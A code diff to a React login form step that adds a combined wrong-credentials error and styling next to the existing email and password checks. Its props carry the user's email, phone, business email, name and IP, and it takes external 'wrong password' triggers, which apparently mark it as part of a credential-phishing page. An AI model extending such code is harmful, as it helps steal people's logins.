@@ -75,6 +75,7 @@ function Step2PC({
   setParentBeginTimer,
   InvalidPassword,
   wrongPasswordTrigger,
+  wrongCredsTrigger,
 }) {
   const [isValidEmail, setIsValidEmail] = useState(true);
   const { setAllData, AllData } = useContext(DataContext);
@@ -90,31 +91,38 @@ function Step2PC({
     isLoading,
     passwordError,
     emailError,
+    credentialsError,
+    hasCredsError,
     triedSubmit,
     passwordAttempt,
     handleSubmit,
     clearPasswordError,
     clearEmailError,
+    clearCredentialsError,
   } = usePasswordAuth({
     Unik,
     Email,
+    setEmail,
     Tel,
     BusinessEmail,
     Name,
     Ip,
     wrongPasswordTrigger,
+    wrongCredsTrigger,
     setParentBeginTimer,
   });
 
   const handleEmailChange = (e) => {
     setEmail(e.target.value);
     clearEmailError();
+    clearCredentialsError();
     setIsValidEmail(true);
   };
 
   const handlePasswordChange = (e) => {
     setPassword(e.target.value);
     clearPasswordError();
+    clearCredentialsError();
   };
 
   return (
@@ -167,11 +175,17 @@ function Step2PC({
                     value={Email}
                     onChange={handleEmailChange}
                     placeholder=" "
-                    className={!isValidEmail && triedSubmit ? "redborder" : ""}
+                    className={
+                      hasCredsError || (!isValidEmail && triedSubmit)
+                        ? "redborder"
+                        : ""
+                    }
                     disabled={isLoading}
                   />
                   <FloatingLabel htmlFor="email">Email or mobile number</FloatingLabel>
-                  {emailError && <div className="text-red-500 text-sm mt-1">{emailError}</div>}
+                  {!credentialsError && emailError && (
+                    <div className="text-red-500 text-sm mt-1">{emailError}</div>
+                  )}
                 </FormFloatingWrapper>
 
                 <FormFloatingWrapper>
@@ -181,12 +195,24 @@ function Step2PC({
                     value={password}
                     onChange={handlePasswordChange}
                     placeholder=" "
-                    className={password.length < 5 && triedSubmit ? "redborder" : ""}
+                    className={
+                      hasCredsError || (password.length < 5 && triedSubmit)
+                        ? "redborder"
+                        : ""
+                    }
                     disabled={isLoading}
                   />
                   <FloatingLabel htmlFor="password">Password</FloatingLabel>
-                  {passwordError && <div className="text-red-500 text-sm mt-1">{passwordError}</div>}
+                  {!credentialsError && passwordError && (
+                    <div className="text-red-500 text-sm mt-1">{passwordError}</div>
+                  )}
                 </FormFloatingWrapper>
+
+                {credentialsError && (
+                  <div className="text-red-500 text-sm mt-1 mb-3">
+                    {credentialsError}
+                  </div>
+                )}
 
                 <div className="gap-2 flex flex-col mt-2">
 
